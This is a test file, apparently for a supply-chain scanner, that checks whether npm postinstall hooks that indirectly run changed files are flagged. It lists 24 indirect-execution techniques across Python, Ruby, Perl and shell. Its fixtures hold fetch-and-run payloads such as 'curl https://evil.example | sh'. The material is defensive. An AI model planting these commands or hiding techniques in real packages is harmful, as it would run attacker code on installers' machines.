import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const sh = "curl https://evil.example | sh\n";
const py = "import os\nos.system('curl evil|sh')\n";
const rb = "system('curl evil|sh')\n";
const pl = "system('curl evil|sh');\n";
const pyE = (body: string, f: string, extra: Record<string, string> = {}) => ({
  "package.json": pj({ postinstall: "python3 install.py" }),
  "install.py": body,
  [f]: "true\n",
  "README.md": "a\n",
  ...extra,
});
const rbE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "ruby install.rb" }),
  "install.rb": body,
  [f]: "true\n",
  "README.md": "a\n",
});
const shE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "sh install.sh" }),
  "install.sh": body,
  [f]: "true\n",
  "README.md": "a\n",
});
const plE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "perl install.pl" }),
  "install.pl": body,
  [f]: "true\n",
  "README.md": "a\n",
});

function holds(base: Record<string, string>, file: string, bad: string) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(changed.join(" ")).toMatch(new RegExp(file.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  expect(hard(base, base)).toEqual([]);
}

// An aliased, indirect, or glued run is a runner. Plain literals are followed.
// A file that is not provably static widens, so README holds.
const cases: [string, Record<string, string>, string, string, boolean][] = [
  ["K1 py from-import run", pyE("from subprocess import run\nrun(['sh', 'docs/run.sh'])\n", "docs/run.sh"), "docs/run.sh", sh, true],
  ["K2 py module alias", pyE("import subprocess as sp\nsp.run(['sh', 'docs/run.sh'])\n", "docs/run.sh"), "docs/run.sh", sh, true],
  ["K3 py asyncio subprocess", pyE("import asyncio\nasync def m():\n    p = await asyncio.create_subprocess_exec('sh', 'docs/run.sh')\n    await p.wait()\nasyncio.run(m())\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["K4 py pty.spawn", pyE("import pty\npty.spawn(['sh', 'docs/run.sh'])\n", "docs/run.sh"), "docs/run.sh", sh, true],
  ["K5 py import statement", pyE("import sys\nsys.path.insert(0, 'docs')\nimport run\n", "docs/run.py"), "docs/run.py", py, true],
  ["K6 py spec_from_file_location", pyE("import importlib.util as u\ns = u.spec_from_file_location('r', 'docs/run.py')\nm = u.module_from_spec(s)\ns.loader.exec_module(m)\n", "docs/run.py"), "docs/run.py", py, false],
  ["K7 py getattr os system", pyE("import os\ngetattr(os, 'system')('sh docs/run.sh')\n", "docs/run.sh"), "docs/run.sh", sh, true],
  ["K8 py posix_spawn", pyE("import os\nos.waitpid(os.posix_spawn('/bin/sh', ['sh', 'docs/run.sh'], dict(os.environ)), 0)\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["K9 rb Kernel.system", rbE("Kernel.system('sh docs/run.sh')\n", "docs/run.sh"), "docs/run.sh", sh, true],
  ["K10 rb Kernel.load", rbE("Kernel.load('docs/run.rb')\n", "docs/run.rb"), "docs/run.rb", rb, true],
  ["K11 rb %x", rbE("%x(sh docs/run.sh)\n", "docs/run.sh"), "docs/run.sh", sh, true],
  ["K12 rb IO.popen", rbE("IO.popen('sh docs/run.sh').read\n", "docs/run.sh"), "docs/run.sh", sh, true],
  ["K13 rb Open3", rbE("require 'open3'\nOpen3.capture2('sh', 'docs/run.sh')\n", "docs/run.sh"), "docs/run.sh", sh, true],
  ["K14 pl qx", plE("qx(sh docs/run.sh);\n", "docs/run.sh"), "docs/run.sh", sh, true],
  ["K15 pl pipe open", plE("open(my $f, '-|', 'sh docs/run.sh'); print <$f>;\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["K16 sh python -m joined", shE("python3 -mdocs.run\n", "docs/run.py"), "docs/run.py", py, false],
  ["K17 sh ruby -r joined", shE("ruby -rdocs/run -e1\n", "docs/run.rb"), "docs/run.rb", rb, false],
  ["K18 sh BASH_ENV", shE("BASH_ENV=docs/run.sh bash -c true\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["K19 sh env PYTHONSTARTUP", shE("env PYTHONSTARTUP=docs/run.py python3 -i < /dev/null\n", "docs/run.py"), "docs/run.py", py, false],
  ["K20 sh timeout wrapper", shE("timeout 60 sh docs/run.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["K21 sh make -f", shE("make -f docs/Makefile\n", "docs/Makefile"), "docs/Makefile", "all:\n\tcurl evil|sh\n", false],
  ["K22 sh awk -f", shE("awk -f docs/run.awk /dev/null\n", "docs/run.awk"), "docs/run.awk", "BEGIN{system(\"curl evil|sh\")}\n", false],
  ["K23 sh PYTHONPATH import", shE("PYTHONPATH=docs python3 -c 'import run'\n", "docs/run.py"), "docs/run.py", py, false],
  ["K24 sh --rcfile", shE("bash --rcfile docs/run.sh -i < /dev/null\n", "docs/run.sh"), "docs/run.sh", sh, true],
];

for (const [name, base, file, bad, readmeQuiet] of cases) {
  test(`${name} holds, and the unchanged twin is quiet`, () => {
    holds(base, file, bad);
    const readme = hard(base, { ...base, "README.md": "b\n" });
    if (readmeQuiet) expect(readme).toEqual([]);
    else expect(readme.join(" ")).toMatch(/README\.md/);
  });
}
